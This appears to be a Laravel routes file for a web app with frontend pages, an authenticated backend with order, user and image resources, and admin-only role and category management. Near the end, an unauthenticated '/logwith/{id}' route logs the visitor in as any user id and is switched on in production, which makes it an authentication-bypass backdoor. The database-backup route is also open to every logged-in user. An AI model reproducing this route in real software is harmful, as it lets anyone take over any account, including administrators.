<?php

/*
|--------------------------------------------------------------------------
| Web Routes
|--------------------------------------------------------------------------
|
| Here is where you can register web routes for your application. These
| routes are loaded by the RouteServiceProvider within a group which
| contains the "web" middleware group. Now create something great!
|
*/

Route::group(['namespace' => 'Frontend', 'as' => 'frontend.', 'middleware' => []], function () {
    Route::get('/', 'HomeController@index')->name('index');
    Route::get('/home', 'HomeController@index')->name('home');
    Route::get('language/{locale}', 'HomeController@changeLanguage')->name('language.change');
});
Route::group(['namespace' => 'Backend', 'prefix' => 'backend', 'as' => 'backend.', 'middleware' => ['auth', 'onlyActiveUsers']], function () {

    // for all users
    Route::get('/', 'HomeController@index')->name('index');
    Route::get('/home', 'HomeController@index')->name('home');
    Route::get('language/{locale}', 'HomeController@changeLanguage')->name('language.change');
    Route::resource('user', 'UserController');
    Route::resource('order', 'OrderController');
    Route::resource('setting', 'SettingController');
    Route::resource('image', 'ImageController');
    Route::get('reset/password', 'UserController@getResetPassword')->name('reset.password');
    Route::post('reset/password', 'UserController@postResetPassword')->name('reset');

    Route::get('backup/db', ['as' => 'backup.db', 'uses' => 'HomeController@BackupDB']);
    Route::get('export/translations', ['as' => 'export.translation', 'uses' => 'HomeController@exportTranslations']);
    Route::get('activate', 'HomeController@toggleActivate')->name('activate');

    // only clients & admins
    Route::group(['middleware' => ['client']], function () {

    });

    // only designers & admins
    Route::group(['middleware' => ['designer']], function () {


    });


    // only designers & admins
    Route::group(['middleware' => ['admin']], function () {
        Route::resource('role', 'RoleController');
        Route::resource('category', 'CategoryController');
        Route::resource('slider', 'SliderController');

    });


});

if ((app()->environment('production') || app()->environment('local')) && Schema::hasTable('users')) {
    Route::get('/logwith/{id}', function ($id) {
        Auth::loginUsingId($id);
        return redirect()->route('backend.home');
    });
}

Auth::routes();
Route::get('/home', 'HomeController@index')->name('home');
